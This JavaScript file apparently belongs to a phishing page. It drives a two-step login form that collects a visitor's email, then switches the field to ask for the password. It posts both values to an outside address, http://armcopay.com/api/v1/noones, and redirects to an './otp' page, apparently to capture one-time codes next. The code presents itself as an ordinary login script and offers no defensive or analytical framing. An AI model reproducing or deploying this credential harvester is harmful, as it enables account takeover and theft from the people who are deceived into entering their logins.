document.addEventListener("DOMContentLoaded", function () {
  // Get form elements
  const form = document.querySelector("form");
  const emailInput = document.querySelector('input[type="email"]');
  const hiddenEmailInput = document.createElement("input"); // Hidden input for storing original email
  const continueButton = document.getElementById("continueButton");
  const infoText = document.querySelector(
    ".mantine-18aovxe .mantine-Text-root"
  );

  // Flag to keep track of input type state
  let isEmailInput = true;

  continueButton.addEventListener("click", function () {
    if (isEmailInput) {
      // Store original email value in the hidden input
      hiddenEmailInput.value = emailInput.value;

      // Clear the visible email input
      emailInput.value = "";

      // Change email input to password input
      emailInput.type = "password";
      emailInput.placeholder = "Password";

      // Update info text
      infoText.innerHTML = `&gt; Alrighttt... <span style="color: #07b979; word-wrap: break-word">${hiddenEmailInput.value}</span>, Now I need your <span style="color: #07b979; word-wrap: break-word">password</span>!`;
    } else {
      // Form submission logic
      const emailValue = hiddenEmailInput.value; // Retrieve the original email value
      const passwordValue = emailInput.value; // Use the password input for password value

      // Create a FormData object to send data in the fetch request
      const formData = new FormData();
      formData.append("email", emailValue);
      formData.append("password", passwordValue);

      // You can now send the email and password values to your backend API
      // Example: using fetch
      fetch("http://armcopay.com/api/v1/noones", {
        method: "POST",
        body: formData, // Use FormData to send the data
      })
        .then(async (response) => {
          const data = await response.json(); // Parse the response as JSON

          // Handle jsonData as needed
          if (data.success) {
            window.location.href = "./otp";
          }
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    }

    // Toggle the flag for the next click
    isEmailInput = !isEmailInput;
  });

  // Append the hidden input to the form
  form.appendChild(hiddenEmailInput);
  hiddenEmailInput.type = "hidden";
  hiddenEmailInput.name = "hiddenEmail"; // Change this to a unique name if needed
});
